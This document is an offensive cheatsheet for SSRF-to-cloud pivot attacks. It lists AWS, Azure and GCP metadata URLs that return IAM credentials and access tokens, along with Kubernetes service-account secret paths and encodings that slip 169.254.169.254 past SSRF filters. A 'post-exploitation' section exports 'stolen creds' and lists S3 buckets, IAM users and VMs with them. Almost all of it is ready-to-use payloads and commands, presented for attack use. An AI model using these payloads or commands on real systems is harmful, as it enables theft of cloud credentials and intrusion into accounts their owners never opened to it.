# Cloud Metadata Endpoints Cheatsheet

> Critical for SSRF → Cloud pivot attacks. Memorize these.

## AWS (IMDSv1)
```
# Instance metadata
http://169.254.169.254/latest/meta-data/

# IAM credentials (GOLD)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# User data (often contains secrets)
http://169.254.169.254/latest/user-data/

# Instance identity
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# Account ID
http://169.254.169.254/latest/dynamic/instance-identity/document
```

## AWS (IMDSv2 — requires token)
```bash
# Get token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Then use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Azure
```
# Instance metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header required: Metadata: true

# Access token (GOLD)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header required: Metadata: true

# Subscription info
http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text
```

## GCP
```
# Instance metadata
http://metadata.google.internal/computeMetadata/v1/
Header required: Metadata-Flavor: Google

# Service account token (GOLD)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Project info
http://metadata.google.internal/computeMetadata/v1/project/project-id

# SSH keys
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
```

## Kubernetes
```
# Service account token
/var/run/secrets/kubernetes.io/serviceaccount/token

# CA cert
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Namespace
/var/run/secrets/kubernetes.io/serviceaccount/namespace

# API server (from within pod)
https://kubernetes.default.svc/
```

## SSRF Bypass Techniques
```
# IP alternatives for 169.254.169.254
http://2852039166/             (decimal)
http://0xA9FEA9FE/            (hex)
http://0251.0376.0251.0376/   (octal)
http://[::ffff:169.254.169.254]/  (IPv6)

# DNS rebinding
Use a domain that resolves to 169.254.169.254

# URL encoding
http://169.254.169.254/ → http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/
```

## Post-Exploitation After Getting Creds

### AWS
```bash
# Configure stolen creds
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Enumerate
aws sts get-caller-identity
aws s3 ls
aws iam list-users
aws ec2 describe-instances
```

### Azure
```bash
# Use stolen token
az login --identity
az account list
az storage account list
az vm list
```

## Notes
> Add your own SSRF → cloud chains here as you discover them
